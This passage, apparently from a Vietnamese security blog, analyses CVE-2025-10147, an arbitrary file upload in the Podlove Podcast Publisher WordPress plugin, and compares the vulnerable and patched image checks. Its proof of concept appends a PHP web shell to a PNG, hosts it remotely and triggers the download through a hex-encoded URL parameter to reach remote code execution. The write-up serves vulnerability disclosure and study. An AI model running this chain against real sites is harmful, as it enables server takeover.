0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;M·∫πo&lt;/p&gt;&lt;p&gt;·ªû ƒë√¢y ta c√≥ th·ªÉ ch·ªâ truy·ªÅn m·ªói &lt;code&gt;$url&lt;/code&gt;, v√≠ d·ª•:&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$url=&amp;quot;https://example.com/filename.php&amp;quot;&lt;/code&gt; th√¨ &lt;code&gt;$this-&amp;gt;id=&amp;quot;b1555a128239e3f59ccfb8d17e5b6c5a&amp;quot;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$this-&amp;gt;upload_basedir=&amp;quot;http://localhost/wp-content/cache/podlove/b1/555a128239e3f59ccfb8d17e5b6c5a&amp;quot;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition success open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-check&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Ta c√≥ th·ªÉ ki·ªÉm so√°t ƒë∆∞·ª£c ƒë∆∞·ªùng d·∫´n c·ªßa file ƒë∆∞·ª£c t·∫°o.&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;move_as_original_file()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi trong h√†m &lt;code&gt;download_source()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function download_source()&#xA;{&#xA;    $source_url = $this-&amp;gt;source_url;&#xA;    ...&#xA;    $source_domain = wp_parse_url($source_url, PHP_URL_HOST);&#xA;    $current_domain = explode(&amp;#39;:&amp;#39;, $_SERVER[&amp;#39;HTTP_HOST&amp;#39;])[0];&#xA;&#xA;    // if domains match, see if the image is part of the Publisher&#xA;    // and can be copied on the filesystem, skipping http&#xA;    if ($current_domain == $source_domain) {&#xA;        ...&#xA;        return;&#xA;    }&#xA;    // for download_url()&#xA;    require_once ABSPATH.&amp;#39;wp-admin/includes/file.php&amp;#39;;&#xA;    $result = self::download_url($this-&amp;gt;source_url);&#xA;    ...&#xA;    list($temp_file, $response) = $result;&#xA;&#xA;    if (!\Podlove\is_image($temp_file)) {&#xA;        ...&#xA;        wp_delete_file($temp_file);&#xA;        return;&#xA;    }&#xA;&#xA;    $this-&amp;gt;create_basedir();&#xA;    $this-&amp;gt;save_cache_data($response);&#xA;    $this-&amp;gt;move_as_original_file($temp_file);&#xA;    wp_delete_file($temp_file);&#xA;    $this-&amp;gt;add_donotbackup_dotfile();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y t·∫£i ·∫£nh t·ª´ URL ng∆∞·ªùi d√πng cung c·∫•p, ki·ªÉm tra h·ª£p l·ªá, r·ªìi l∆∞u c·ªë ƒë·ªãnh v√†o th∆∞ m·ª•c cache c·ªßa plugin. C·ª• th·ªÉ:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;$source_url&lt;/code&gt; l·∫•y URL h√¨nh ·∫£nh do ng∆∞·ªùi d√πng cung c·∫•p.&lt;/li&gt;&#xA;&lt;li&gt;H√†m t√°ch domain t·ª´ &lt;code&gt;$source_url&lt;/code&gt; v√† domain hi·ªán t·∫°i c·ªßa site (&lt;code&gt;$_SERVER[&#39;HTTP_HOST&#39;]&lt;/code&gt;).&#xA;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu hai domain tr√πng nhau ‚Üí ·∫£nh n·∫±m trong c√πng site th·ª±c hi·ªán logic v√† tr·∫£ v·ªÅ.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu kh√°c domain ‚Üí d√πng &lt;code&gt;download_url()&lt;/code&gt; ƒë·ªÉ t·∫£i file t·∫°m v·ªÅ m√°y ch·ªß.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function download_url($url, $timeout = 300, $extra_args = [])&#xA;{&#xA;    ...&#xA;    $tmpfname = wp_tempnam($url);&#xA;    if (!$tmpfname) {&#xA;        return new \WP_Error(&amp;#39;http_no_file&amp;#39;, __(&amp;#39;Could not create Temporary file.&amp;#39;));&#xA;    }&#xA;&#xA;    $default_args = [&#xA;        &amp;#39;timeout&amp;#39; =&amp;gt; $timeout,&#xA;        &amp;#39;stream&amp;#39; =&amp;gt; true,&#xA;        &amp;#39;filename&amp;#39; =&amp;gt; $tmpfname,&#xA;        &amp;#39;sslverify&amp;#39; =&amp;gt; \Podlove\get_setting(&amp;#39;website&amp;#39;, &amp;#39;ssl_verify_peer&amp;#39;) == &amp;#39;on&amp;#39;,&#xA;    ];&#xA;    $args = array_merge($default_args, $extra_args);&#xA;&#xA;    $response = wp_safe_remote_get($url, $args);&#xA;&#xA;    if (is_wp_error($response)) {&#xA;        wp_delete_file($tmpfname);&#xA;&#xA;        return $response;&#xA;    }&#xA;&#xA;    if (200 != wp_remote_retrieve_response_code($response)) {&#xA;        wp_delete_file($tmpfname);&#xA;&#xA;        return new \WP_Error(&amp;#39;http_404&amp;#39;, trim(wp_remote_retrieve_response_message($response)));&#xA;    }&#xA;&#xA;    return [$tmpfname, $response];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;download_url()&lt;/code&gt; t·∫£i n·ªôi dung t·ª´ URL v√†o file t·∫°m tr√™n server v√† tr·∫£ v·ªÅ &lt;strong&gt;ƒë∆∞·ªùng d·∫´n file ƒë√≥&lt;/strong&gt; c√πng &lt;strong&gt;response&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Ki·ªÉm tra xem file t·∫£i v·ªÅ c√≥ ph·∫£i ·∫£nh h·ª£p l·ªá b·∫±ng &lt;code&gt;\Podlove\is_image()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;function is_image($file)&#xA;{&#xA;    $type = get_image_type($file);&#xA;    $mime = get_image_mime_type($type);&#xA;&#xA;    return substr($mime, 0, 5) == &amp;#39;image&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;·ªû b·∫£n l·ªói, h√†m &lt;code&gt;is_image()&lt;/code&gt; ch·ªâ &lt;strong&gt;ki·ªÉm tra MIME type&lt;/strong&gt; c·ªßa file - c·ª• th·ªÉ l√† l·∫•y ki·ªÉu MIME r·ªìi xem n√≥ c√≥ b·∫Øt ƒë·∫ßu b·∫±ng &amp;ldquo;image&amp;rdquo; kh√¥ng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Ch·ªâ c·∫ßn file gi·∫£ d·∫°ng c√≥ header gi·ªëng ·∫£nh (v√≠ d·ª• file &lt;code&gt;.php&lt;/code&gt; nh∆∞ng ch√®n v√†i byte ·∫£nh ƒë·∫ßu ti√™n &lt;code&gt;image/png&lt;/code&gt;) l√† qua m·∫∑t ƒë∆∞·ª£c ngay üò¨&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;function is_image($file, $filename = &amp;#34;&amp;#34;)&#xA;{&#xA;    // simple PHP based checks&#xA;    $type = get_image_type($file);&#xA;    $mime = get_image_mime_type($type);&#xA;    $mime_is_image = substr($mime, 0, 5) == &amp;#39;image&amp;#39;;&#xA;&#xA;    // more checks using WP helpers&#xA;    if (!$filename) {&#xA;      $filename = basename($file);&#xA;    }&#xA;    &#xA;    $check = wp_check_filetype_and_ext($file, $filename);&#xA;    $ext = isset($check[&amp;#39;ext&amp;#39;]) &amp;amp;&amp;amp; $check[&amp;#39;ext&amp;#39;] ? strtolower($check[&amp;#39;ext&amp;#39;]) : null;&#xA;    $wp_type = isset($check[&amp;#39;type&amp;#39;]) &amp;amp;&amp;amp; $check[&amp;#39;type&amp;#39;] ? strtolower($check[&amp;#39;type&amp;#39;]) : null;&#xA;&#xA;    $wp_type_looks_correct = stripos($wp_type, &amp;#39;image/&amp;#39;) === 0;&#xA;    &#xA;    // denielist some exts for extra safety&#xA;    $danger_exts = [&#xA;      &amp;#39;php&amp;#39;, &amp;#39;php3&amp;#39;, &amp;#39;php4&amp;#39;, &amp;#39;php5&amp;#39;, &amp;#39;phtml&amp;#39;, &amp;#39;phar&amp;#39;, &amp;#39;pl&amp;#39;, &amp;#39;py&amp;#39;, &amp;#39;rb&amp;#39;, &amp;#39;cgi&amp;#39;, &amp;#39;asp&amp;#39;, &amp;#39;aspx&amp;#39;, &amp;#39;jsp&amp;#39;,&#xA;    ];&#xA;&#xA;    $ext_looks_dangerous = empty($ext) || in_array($ext, $danger_exts, true);&#xA;&#xA;    return $mime_is_image &amp;amp;&amp;amp; !$ext_looks_dangerous &amp;amp;&amp;amp; $wp_type_looks_correct; &#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;B·∫£n v√° ƒë√£ th√™m c·∫£ m·ªôt m·ªõ ki·ªÉm tra ch·∫∑t h∆°n:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;V·∫´n gi·ªØ check MIME g·ªëc (&lt;code&gt;$mime_is_image&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;li&gt;Th√™m check qua WordPress helper &lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_check_filetype_and_ext/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt;&lt;/a&gt; ƒë·ªÉ so kh·ªõp ƒëu√¥i file v√† ki·ªÉu MIME th·ª±c t·∫ø&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu kh√¥ng c√≥ t√™n file, t·ª± l·∫•y &lt;code&gt;basename()&lt;/code&gt; ƒë·ªÉ ki·ªÉm tra&lt;/li&gt;&#xA;&lt;li&gt;Ch·∫∑n h√†ng lo·∫°t ƒëu√¥i nguy hi·ªÉm (&lt;code&gt;php&lt;/code&gt;, &lt;code&gt;phar&lt;/code&gt;, &lt;code&gt;py&lt;/code&gt;, &lt;code&gt;jsp&lt;/code&gt;, &lt;code&gt;v.v...&lt;/code&gt;) b·∫±ng danh s√°ch ƒëen &lt;code&gt;$danger_exts&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;K·∫øt h·ª£p ba ƒëi·ªÅu ki·ªán: ph·∫£i l√† MIME image, ƒëu√¥i kh√¥ng nguy hi·ªÉm, v√† WP c≈©ng nh·∫≠n di·ªán ƒë√∫ng ki·ªÉu ·∫£nh&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Chuy·ªÉn file t·∫°m sang v·ªã tr√≠ th·∫≠t b·∫±ng &lt;code&gt;move_as_original_file($temp_file)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;&lt;code&gt;download_source()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi t·ª´ h√†m &lt;code&gt;podlove_handle_cache_files()&lt;/code&gt; khi ·∫£nh ch∆∞a t·ªìn t·∫°i&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function podlove_handle_cache_files()&#xA;{&#xA;    $source_url = \Podlove\PHP\hex2str(podlove_get_query_var(&amp;#39;podlove_image_cache_url&amp;#39;));&#xA;    ...&#xA;&#xA;    $image = new Image($source_url, $file_name);&#xA;&#xA;    if (!$image-&amp;gt;source_exists()) {&#xA;        $image-&amp;gt;download_source();&#xA;    }&#xA;    ...&#xA;}&#xA;&#xA;function podlove_get_query_var($var_name)&#xA;{&#xA;    if (isset($_GET[$var_name])) {&#xA;        return $_GET[$var_name];&#xA;    }&#xA;&#xA;    return get_query_var($var_name);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;podlove_handle_cache_files()&lt;/code&gt; nh·∫≠n tham s·ªë &lt;code&gt;podlove_image_cache_url&lt;/code&gt; t·ª´ GET request, sau ƒë√≥ gi·∫£i m√£ b·∫±ng &lt;code&gt;hex2str()&lt;/code&gt; ƒë·ªÉ chuy·ªÉn t·ª´ ƒë·ªãnh d·∫°ng hex sang chu·ªói.&#xA;=&amp;gt; Tham s·ªë &lt;code&gt;podlove_image_cache_url&lt;/code&gt; ph·∫£i ƒë∆∞·ª£c truy·ªÅn d∆∞·ªõi d·∫°ng m√£ hex.&lt;/p&gt;&#xA;&lt;p&gt;Ti·∫øp theo, h√†m kh·ªüi t·∫°o ƒë·ªëi t∆∞·ª£ng &lt;strong&gt;Image&lt;/strong&gt; nh·∫±m t·∫°o ƒë∆∞·ªùng d·∫´n l∆∞u tr·ªØ trong cache v√† th·ª±c hi·ªán t·∫£i file t·ª´ URL ƒë√£ gi·∫£i m√£ v·ªÅ m√°y ch·ªß.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;podlove_handle_cache_files()&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho action hook&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp&amp;#39;, &amp;#39;podlove_handle_cache_files&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nghƒ©a l√† h√†m s·∫Ω ƒë∆∞·ª£c g·ªçi tr√™n m·ªói l·∫ßn WordPress x·ª≠ l√Ω request.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Request with params (podlove_image_cache_url)&amp;#34;] --&amp;gt; B[&amp;#34;podlove_handle_cache_files()&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;hex2str() ‚Üí $source_url ‚Üí new Image(...)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;download_source() ‚Üí download_url() ‚Üí temporary file&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;is_image() check&amp;#34;]&#xA;E -- pass --&amp;gt; F[&amp;#34;move_as_original_file() ‚Üí save to wp-content/cache/podlove/first_2_characters/remaining_characters/&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;File accessible ‚Üí possible RCE&amp;#34;]&#xA;E -- fail --&amp;gt; H[&amp;#34;Delete temp file ‚Üí stop&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Th√™m &lt;code&gt;&amp;lt;php&amp;gt;&lt;/code&gt; tag v√†o file ·∫£nh v√† ƒë·ªïi extension th√†nh &lt;code&gt;.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;echo &amp;#39;&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;]); ?&amp;gt;&amp;#39; &amp;gt;&amp;gt; rce.png&#xA;mv rce.png rce.php&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;‚ùØ cat rce.php&#xA;ÔøΩPNG&#xA;‚ê¶&#xA;IHDÔøΩÔøΩUdÔøΩtEXtSoftwaregnome-screenshotÔøΩÔøΩ&amp;gt;-tEXtCreation TimeSat 01 Nov 2025 02:58:29 PM &amp;#43;075ÔøΩÔøΩÔøΩÔøΩIDATHÔøΩÔøΩÔøΩA&#xA;ÔøΩ ÔøΩÔøΩGHIÔøΩÔøΩlÔøΩÔøΩlÔøΩÀÖÔøΩÔøΩKÔøΩnÔøΩD&#xA;ÔøΩH)ÔøΩÔøΩÔøΩa:koo‹≤&amp;lt;`ÔøΩuÔøΩoÔøΩ&#xA;ÔøΩ{ÔøΩ3ÔøΩ9ÔøΩ1ÔøΩ~ÔøΩÔøΩ      ÔøΩ9ÔøΩÔøΩÔøΩÔøΩPÔøΩ1ÔøΩÔøΩÔøΩÔøΩRÔøΩ!D&amp;gt;LkÔøΩÔøΩÔøΩFTÔøΩrÔøΩ|ÔøΩRuÔøΩÔøΩ&#x9;uÔøΩÔøΩo&amp;#39;ÔøΩ`ÔøΩÔøΩ?ÔøΩ!&amp;#34;ÔøΩÔøΩ&#xA;2kÔøΩÔøΩÔøΩIENDÔøΩB`ÔøΩ&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;]); ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;L∆∞u file ·ªü ƒë√¢u ƒë√≥ tr√™n internet, domain kh√¥ng tr√πng v·ªõi wordpress domain website,&#xA;v√≠ d·ª•:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;M√£ h√≥a hex(&lt;a href=&#34;https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php&lt;/a&gt;)&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;‚ùØ echo -n &amp;#34;https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php&amp;#34; | xxd -p&#xA;68747470733a2f2f6769746875622e636f6d2f7734316275312f773431746573742f7261772f726566732f68656164732f6d61696e2f7263652e706870&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;G·ª≠i GET request v·ªõi param &lt;code&gt;podlove_image_cache_url=68747470733a2f2f6769746875622e636f6d2f7734316275312f773431746573742f7261772f726566732f68656164732f6d61696e2f7263652e706870&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-05-cve-2025-10147/file_uploaded.png&#34; title=&#34;Upload file th√†nh c√¥ng&#34; data-thumbnail=&#34;/posts/2025-11-05-cve-2025-10147/file_uploaded.png&#34; data-sub-html=&#34;&lt;h2&gt;File Uploaded&lt;/h2&gt;&lt;p&gt;Upload file th√†nh c√¥ng&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-05-cve-2025-10147/file_uploaded.png&#39; alt=&#34;File Uploaded&#34; height=&#34;414&#34; width=&#34;1541&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Upload file th√†nh c√¥ng&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Truy c·∫≠p file v·ª´a t·∫°o v√† RCE&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-05-cve-2025-10147/result.png&#34; title=&#34;RCE v·ªõi file upload&#34; data-thumbnail=&#34;/posts/2025-11-05-cve-2025-10147/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE v·ªõi file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-05-cve-2025-10147/result.png&#39; alt=&#34;Result&#34; height=&#34;723&#34; width=&#34;1541&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE v·ªõi file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Th√¥ng tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;code&gt;02/9acf743e6beb9c8e4395ee694d6504&lt;/code&gt; nh∆∞ ph√¢n t√≠ch tr∆∞·ªõc ƒë√≥, n√≥ l√† &lt;code&gt;md5($url)&lt;/code&gt;, sau ƒë√≥ t·∫°o c·∫•u tr√∫c th∆∞ m·ª•c &lt;code&gt;first_2_characters/remaining_characters&lt;/code&gt; d·ª±a tr√™n k·∫øt qu·∫£ c·ªßa &lt;code&gt;md5()&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng trong &lt;strong&gt;Podlove Podcast Publisher ‚â§ 4.2.6&lt;/strong&gt; cho ph√©p t·∫£i l√™n file t√πy √Ω do thi·∫øu ki·ªÉm tra ƒë·ªãnh d·∫°ng trong &lt;code&gt;move_as_original_file()&lt;/code&gt;. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ t·∫£i file ƒë·ªôc h·∫°i (v√≠ d·ª• &lt;code&gt;.php&lt;/code&gt;) l√™n th∆∞ m·ª•c:&#xA;&lt;code&gt;wp-content/cache/podlove/&amp;lt;first2&amp;gt;/&amp;lt;rest&amp;gt;/&lt;/code&gt;,&#xA;t·ª´ ƒë√≥ d·∫´n ƒë·∫øn &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt; n·∫øu file ƒë∆∞·ª£c truy c·∫≠p c√¥ng khai.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 